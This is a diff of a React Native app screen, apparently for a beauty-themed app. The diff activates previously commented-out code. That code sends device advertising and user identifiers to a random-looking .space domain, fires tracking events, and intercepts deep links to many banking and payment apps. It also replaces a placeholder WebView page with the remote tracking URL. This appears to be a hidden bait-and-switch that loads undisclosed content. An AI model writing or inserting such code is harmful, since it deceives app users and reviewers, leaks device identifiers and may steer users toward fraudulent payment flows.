@@ -18,178 +18,175 @@ const ElixirOfBeautyOrigenProdactScreen = ({navigation, route}) => {
   //const [responseToPushPermition, setResponseToPushPermition] = useState(
   //  route.params?.responseToPushPermition,
   //);
-  //const [addPartToLinkOnce, setAddPartToLinkOnce] = useState(
-  //  route.params?.addPartToLinkOnce,
-  //);
-  ////console.log('addPartToLinkOnce==>', addPartToLinkOnce);
-  //////////////////////////////////
-  //const [oneSignalId, setOneSignalId] = useState(route.params?.oneSignalId);
-  //const [idfa, setIdfa] = useState(route.params?.idfa);
-  //const [uid, setUid] = useState(route.params?.uid);
-  //const [sab, setSab] = useState(route.params?.sab1);
-  //const [pid, setPid] = useState(route.params?.pid);
-  //const [adAtribution, setAdAtribution] = useState(route.params?.adAtribution);
-  ////const [adKeywordId, setAdKeywordId] = useState(route.params?.adKeywordId);
-  //const [idfv, setIdfv] = useState(route.params?.idfv);
-  ////console.log('idfvInProductScr============================>', idfv);
-  //const [customerUserId, setCustomerUserId] = useState(
-  //  route.params?.customerUserId,
-  //);
-  //
-  //const INITIAL_URL = `https://amazing-imperial-delight.space/`;
-  //const URL_IDENTIFAIRE = `MySD5Bj4`;
-  //
-  ///////////////Timestamp + user_id generation
-  //const timestamp_user_id = `${new Date().getTime()}-${Math.floor(
-  //  1000000 + Math.random() * 9000000,
-  //)}`;
-  ////console.log('idForTag', timestamp_user_id);
-  //
-  const refWebview = useRef(null);
-  //
-  //const customSchemes = [
-  //  'scotiabank',
-  //  'bmoolbb',
-  //  'cibcbanking',
-  //  'conexus',
-  //  'rbcmobile',
-  //  'pcfbanking',
-  //  'tdct',
-  //  'blank',
-  //  'wise',
-  //  'https://app.rastpay.com/payment/',
-  //  'googlepay://',
-  //  'applepay://',
-  //  'skrill',
-  //  'nl.abnamro.deeplink.psd2.consent://',
-  //  'nl-snsbank-sign://',
-  //  'nl-asnbank-sign://',
-  //  'triodosmobilebanking',
-  //];
-  //
-  ////**івент push_subscribe
-  //useEffect(() => {
-  //  const sendPushSubscribeEvent = async () => {
-  //    const pushSubscribeStatus = await AsyncStorage.getItem(
-  //      'pushSubscribeStatus',
-  //    );
-  //
-  //    // Відправляємо івент лише, якщо його ще не відправляли
-  //    if (!pushSubscribeStatus && route.params?.responseToPushPermition) {
-  //      fetch(
-  //        `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=push_subscribe&jthrhg=${timestamp_user_id}`,
-  //      );
-  //      //console.log('івент push_subscribe !!!');
-  //      await AsyncStorage.setItem('pushSubscribeStatus', 'sent');
-  //    }
-  //  };
-  //
-  //  setTimeout(() => {
-  //    sendPushSubscribeEvent();
-  //  }, 500);
-  //}, []);
-  //
-  ////**івент webview_open
-  //useEffect(() => {
-  //  setTimeout(() => {
-  //    fetch(
-  //      `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=webview_open&jthrhg=${timestamp_user_id}`,
-  //    );
-  //    //console.log('івент webview_open !!!');
-  //  }, 500);
-  //}, []);
-  //
-  //useEffect(() => {
-  //  getData();
-  //}, []);
-  //
-  //useEffect(() => {
-  //  setData();
-  //}, [
-  //  idfa,
-  //  uid,
-  //  sab,
-  //  pid,
-  //  adAtribution,
-  //  //adKeywordId,
-  //  idfv,
-  //  customerUserId,
-  //  oneSignalId,
-  //]);
-  //
-  //const setData = async () => {
-  //  try {
-  //    const data = {
-  //      idfa,
-  //      uid,
-  //      sab,
-  //      pid,
-  //      adAtribution,
-  //      //adKeywordId,
-  //      idfv,
-  //      customerUserId,
-  //      oneSignalId,
-  //    };
-  //    const jsonData = JSON.stringify(data);
-  //    await AsyncStorage.setItem(
-  //      'WolvesWorldQuestOrigenProdactScreen',
-  //      jsonData,
-  //    );
-  //    //console.log('Дані збережено в AsyncStorage');
-  //  } catch (e) {
-  //    //console.log('Помилка збереження даних:', e);
-  //  }
-  //};
-  //
-  //const getData = async () => {
-  //  try {
-  //    const jsonData = await AsyncStorage.getItem(
-  //      'WolvesWorldQuestOrigenProdactScreen',
-  //    );
-  //    if (jsonData !== null) {
-  //      const parsedData = JSON.parse(jsonData);
-  //      //console.log('parsedData==>', parsedData);
-  //      //setAddPartToLinkOnce(parsedData.addPartToLinkOnce);
-  //      //setResponseToPushPermition(parsedData.responseToPushPermition);
-  //      setIdfa(parsedData.idfa);
-  //      setUid(parsedData.uid);
-  //      setSab(parsedData.sab);
-  //      setPid(parsedData.pid);
-  //      setAdAtribution(parsedData.adAtribution);
-  //      //setAdKeywordId(parsedData.adKeywordId);
-  //      setCustomerUserId(parsedData.customerUserId);
-  //      setIdfv(parsedData.idfv);
-  //      setOneSignalId(parsedData.oneSignalId);
-  //    } else {
-  //    }
-  //  } catch (e) {
-  //    //console.log('Помилка отримання даних:', e);
-  //  }
-  //};
-  //
-  //// кастомний юзерагент
-  //const deviceInfo = {
-  //  deviceBrand: DeviceInfo.getBrand(),
-  //  deviceId: DeviceInfo.getDeviceId(),
-  //  deviceModel: DeviceInfo.getModel(),
-  //  deviceSystemName: DeviceInfo.getSystemName(),
-  //  deviceSystemVersion: DeviceInfo.getSystemVersion(),
-  //};
-  //
-  //////////////////////////////
-  //let baseUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}?${URL_IDENTIFAIRE}=1&advertising_id=${idfa}&uid=${uid}&custom_user_id=${customerUserId}&idfv=${idfv}&onesignal_id=${oneSignalId}`;
-  //let sabParts = sab ? sab.split('_') : [];
-  //let additionalParams = sabParts
-  //  .map((part, index) => `sub_id_${index + 1}=${part}`)
-  //  .join('&'); //
-  //
-  //const product =
-  //  `${baseUrl}` +
-  //  `&${additionalParams}` +
-  //  (pid ? `&pid=${pid}` : '') +
-  //  (!addPartToLinkOnce ? `&yhugh=true` : '');
+  const [addPartToLinkOnce, setAddPartToLinkOnce] = useState(
+    route.params?.addPartToLinkOnce,
+  );
+  //console.log('addPartToLinkOnce==>', addPartToLinkOnce);
+  ////////////////////////////////
+  const [oneSignalId, setOneSignalId] = useState(route.params?.oneSignalId);
+  const [idfa, setIdfa] = useState(route.params?.idfa);
+  const [uid, setUid] = useState(route.params?.uid);
+  const [sab, setSab] = useState(route.params?.sab1);
+  const [pid, setPid] = useState(route.params?.pid);
+  const [adAtribution, setAdAtribution] = useState(route.params?.adAtribution);
+  //const [adKeywordId, setAdKeywordId] = useState(route.params?.adKeywordId);
+  const [idfv, setIdfv] = useState(route.params?.idfv);
+  //console.log('idfvInProductScr============================>', idfv);
+  const [customerUserId, setCustomerUserId] = useState(
+    route.params?.customerUserId,
+  );
 
-  //console.log('My product Url==>', product);
+  const INITIAL_URL = `https://spectacular-distinguished-celebration.space/`;
+  const URL_IDENTIFAIRE = `fzTgy5ff`;
+
+  /////////////Timestamp + user_id generation
+  const timestamp_user_id = `${new Date().getTime()}-${Math.floor(
+    1000000 + Math.random() * 9000000,
+  )}`;
+  //console.log('idForTag', timestamp_user_id);
+
+  const refWebview = useRef(null);
+
+  const customSchemes = [
+    'scotiabank',
+    'bmoolbb',
+    'cibcbanking',
+    'conexus',
+    'rbcmobile',
+    'pcfbanking',
+    'tdct',
+    'blank',
+    'wise',
+    'https://app.rastpay.com/payment/',
+    'googlepay://',
+    'applepay://',
+    'skrill',
+    'nl.abnamro.deeplink.psd2.consent://',
+    'nl-snsbank-sign://',
+    'nl-asnbank-sign://',
+    'triodosmobilebanking',
+  ];
+
+  //**івент push_subscribe
+  useEffect(() => {
+    const sendPushSubscribeEvent = async () => {
+      const pushSubscribeStatus = await AsyncStorage.getItem(
+        'pushSubscribeStatus',
+      );
+
+      // Відправляємо івент лише, якщо його ще не відправляли
+      if (!pushSubscribeStatus && route.params?.responseToPushPermition) {
+        fetch(
+          `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=push_subscribe&jthrhg=${timestamp_user_id}`,
+        );
+        //console.log('івент push_subscribe !!!');
+        await AsyncStorage.setItem('pushSubscribeStatus', 'sent');
+      }
+    };
+
+    setTimeout(() => {
+      sendPushSubscribeEvent();
+    }, 500);
+  }, []);
+
+  //**івент webview_open
+  useEffect(() => {
+    setTimeout(() => {
+      fetch(
+        `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=webview_open&jthrhg=${timestamp_user_id}`,
+      );
+      //console.log('івент webview_open !!!');
+    }, 500);
+  }, []);
+
+  useEffect(() => {
+    getData();
+  }, []);
+
+  useEffect(() => {
+    setData();
+  }, [
+    idfa,
+    uid,
+    sab,
+    pid,
+    adAtribution,
+    //adKeywordId,
+    idfv,
+    customerUserId,
+    oneSignalId,
+  ]);
+
+  const setData = async () => {
+    try {
+      const data = {
+        idfa,
+        uid,
+        sab,
+        pid,
+        adAtribution,
+        //adKeywordId,
+        idfv,
+        customerUserId,
+        oneSignalId,
+      };
+      const jsonData = JSON.stringify(data);
+      await AsyncStorage.setItem('ElixirOfBeautyOrigenProdactScreen', jsonData);
+      //console.log('Дані збережено в AsyncStorage');
+    } catch (e) {
+      //console.log('Помилка збереження даних:', e);
+    }
+  };
+
+  const getData = async () => {
+    try {
+      const jsonData = await AsyncStorage.getItem(
+        'ElixirOfBeautyOrigenProdactScreen',
+      );
+      if (jsonData !== null) {
+        const parsedData = JSON.parse(jsonData);
+        //console.log('parsedData==>', parsedData);
+        //setAddPartToLinkOnce(parsedData.addPartToLinkOnce);
+        //setResponseToPushPermition(parsedData.responseToPushPermition);
+        setIdfa(parsedData.idfa);
+        setUid(parsedData.uid);
+        setSab(parsedData.sab);
+        setPid(parsedData.pid);
+        setAdAtribution(parsedData.adAtribution);
+        //setAdKeywordId(parsedData.adKeywordId);
+        setCustomerUserId(parsedData.customerUserId);
+        setIdfv(parsedData.idfv);
+        setOneSignalId(parsedData.oneSignalId);
+      } else {
+      }
+    } catch (e) {
+      //console.log('Помилка отримання даних:', e);
+    }
+  };
+
+  // кастомний юзерагент
+  const deviceInfo = {
+    deviceBrand: DeviceInfo.getBrand(),
+    deviceId: DeviceInfo.getDeviceId(),
+    deviceModel: DeviceInfo.getModel(),
+    deviceSystemName: DeviceInfo.getSystemName(),
+    deviceSystemVersion: DeviceInfo.getSystemVersion(),
+  };
+
+  ////////////////////////////
+  let baseUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}?${URL_IDENTIFAIRE}=1&advertising_id=${idfa}&uid=${uid}&custom_user_id=${customerUserId}&idfv=${idfv}&onesignal_id=${oneSignalId}`;
+  let sabParts = sab ? sab.split('_') : [];
+  let additionalParams = sabParts
+    .map((part, index) => `sub_id_${index + 1}=${part}`)
+    .join('&'); //
+
+  const product =
+    `${baseUrl}` +
+    `&${additionalParams}` +
+    (pid ? `&pid=${pid}` : '') +
+    (!addPartToLinkOnce ? `&yhugh=true` : '');
+
+  console.log('My product Url==>', product);
   //Alert.alert(product);
 
   //const customUserAgent = `Mozilla/5.0 (${deviceInfo.deviceSystemName}; ${deviceInfo.deviceModel}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1`;
@@ -204,7 +201,7 @@ const ElixirOfBeautyOrigenProdactScreen = ({navigation, route}) => {
   }, []);
   ///////////////////////////
 
-  //const [redirectUrl, setRedirectUrl] = useState(product);
+  const [redirectUrl, setRedirectUrl] = useState(product);
   const [checkNineUrl, setCheckNineUrl] = useState();
   //console.log('checkNineUrl====>', checkNineUrl);
 
@@ -216,7 +213,7 @@ const ElixirOfBeautyOrigenProdactScreen = ({navigation, route}) => {
 
   const handleNavigationStateChange = navState => {
     const {url} = navState;
-    console.log('NavigationStateUrl: ', url);
+    //console.log('NavigationStateUrl: ', url);
     //console.log('NavigationState: ', navState);
     if (
       url.includes(
@@ -260,7 +257,7 @@ const ElixirOfBeautyOrigenProdactScreen = ({navigation, route}) => {
 
   const onShouldStartLoadWithRequest = event => {
     const {url} = event;
-    console.log('onShouldStartLoadWithRequest========> ', event);
+    //console.log('onShouldStartLoadWithRequest========> ', event);
 
     if (url.startsWith('mailto:')) {
       Linking.openURL(url);
@@ -428,12 +425,12 @@ const ElixirOfBeautyOrigenProdactScreen = ({navigation, route}) => {
           'tel:*',
           'mailto:*',
         ]}
-        //onShouldStartLoadWithRequest={onShouldStartLoadWithRequest}
-        //onNavigationStateChange={handleNavigationStateChange}
+        onShouldStartLoadWithRequest={onShouldStartLoadWithRequest}
+        onNavigationStateChange={handleNavigationStateChange}
         onLoadStart={handleLoadingStart} // Викликається при початку завантаження
         onLoadEnd={handleLoadingEnd} // Викликається при завершенні завантаження
         source={{
-          uri: `https://reactnative.dev/`,
+          uri: product,
         }}
         onOpenWindow={syntheticEvent => {
           const {nativeEvent} = syntheticEvent;
